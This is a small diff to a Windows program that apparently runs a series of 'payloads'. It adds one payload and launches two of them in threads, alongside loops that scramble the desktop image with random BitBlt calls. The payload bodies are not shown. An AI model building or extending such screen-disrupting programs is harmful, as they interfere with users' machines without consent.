@@ -32,7 +32,8 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
         p6,
         p7,
         p8,
-        p9
+        p9,
+        p10
     }; // use: payloads[x]() for function px(). why use this? functions in random order, im still working on porting all payloads to payloads.h
 
     DWORD zero = 0;
@@ -158,7 +159,9 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
         Sleep(50);
     }
 
-    payloads[4]();
+    CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[10], NULL, NULL, NULL);
+
+    CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[4], NULL, NULL, NULL);
 
     HANDLE hHDC = CreateCompatibleDC(desk);
 
@@ -176,7 +179,7 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
         BitBlt(desk, rand() % w, rand() % h, rand() % w, rand() % h, desk, rand() % w, rand() % h, SRCERASE);
         Sleep(50);
     }
-
+    
     payloads[6]();
 
     payloads[8]();
